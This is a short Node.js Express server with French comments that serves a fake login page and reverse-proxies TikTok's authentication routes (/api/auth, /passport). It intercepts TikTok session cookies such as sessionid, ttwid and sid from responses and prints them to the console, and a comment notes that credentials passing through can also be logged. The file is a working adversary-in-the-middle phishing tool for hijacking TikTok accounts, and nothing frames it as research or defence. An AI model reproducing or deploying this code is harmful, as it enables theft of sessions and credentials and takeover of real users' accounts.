const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

// 1. On sert ton interface de connexion (index.html)
app.use(express.static(path.join(__dirname)));

// 2. CONFIGURATION DU PROXY (Style Reverse Proxy)
const tiktokProxy = createProxyMiddleware({
    target: 'https://www.tiktok.com',
    changeOrigin: true,
    selfHandleResponse: false, // On laisse passer la réponse vers l'utilisateur
    onProxyRes: function (proxyRes, req, res) {
        // INTERCEPTION DES COOKIES DANS LES HEADERS DE RÉPONSE
        const sc = proxyRes.headers['set-cookie'];
        if (sc) {
            console.log("\n[!] SESSION DETECTÉE - COOKIES INTERCEPTÉS :");
            sc.forEach(cookie => {
                // On affiche uniquement les cookies importants (sessionid, ttwid, etc.)
                if(cookie.includes('sessionid') || cookie.includes('ttwid') || cookie.includes('sid')) {
                    console.log(">>> " + cookie.split(';')[0]);
                }
            });
            console.log("------------------------------------------\n");
        }
    },
    onProxyReq: (proxyReq, req, res) => {
        // On peut logguer les identifiants ici s'ils passent par le proxy
        if (req.method === 'POST') {
            console.log("[*] Flux POST détecté vers TikTok...");
        }
    }
});

// 3. On redirige toutes les requêtes d'authentification vers le proxy
app.use('/api/auth', tiktokProxy);
app.use('/passport', tiktokProxy); // TikTok utilise souvent /passport pour le login

app.listen(PORT, () => {
    console.log(`Bacops Reverse-Proxy actif sur le port ${PORT}`);
});
